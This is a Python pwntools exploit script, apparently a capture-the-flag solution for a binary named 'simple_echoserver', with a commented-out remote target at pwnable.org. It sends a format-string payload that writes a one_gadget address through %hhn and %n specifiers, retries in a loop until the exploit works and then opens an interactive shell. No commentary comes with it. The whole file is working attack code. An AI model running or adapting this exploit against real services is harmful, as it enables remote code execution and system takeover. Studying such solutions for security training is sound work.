from pwn import *

def exploit(s):
    onegadget = 0xe5863    # ([r10] == NULL || r10 == NULL) && ([rdx] == NULL || rdx == NULL)
    #s.sendlineafter("Your name: ", "%{}c%{}$hhn%{}c%*{}$c%{}$n".format(0x18-8-len("[USER] name: "), (0xe160-0xe150)//8+5, onegadget-(0x7ffff7a72300-0x7ffff79e4000)-(0x18-8), (0xe218-0xe150)//8+5, (0xe1f8-0xe150)//8+5))
    s.sendlineafter("Your name: ", "%3c%7$hhn%357715c%*30$c%26$n")
    s.sendlineafter("Your phone: ", "0"*(0xe218-0xe200))    # "0"*0x18
    s.sendlineafter("Now enjoy yourself!\n", "~.")
    try:
        s.sendline("echo success")
        r = s.recvuntil("success", timeout=1)
        if not r:
            print("")
            raise EOFError
    except EOFError:
        return False
    return True

def main():
    f = open("/dev/null", "wb")
    i = 1
    while True:
        print(i)
        s = process("./simple_echoserver", stdout=PIPE, stderr=f)
        # s = remote("pwnable.org", 12020)
        r = exploit(s)
        if r:
            s.interactive()
            break
        s.close()
        i += 1
    f.close()

if __name__ == "__main__":
    main()

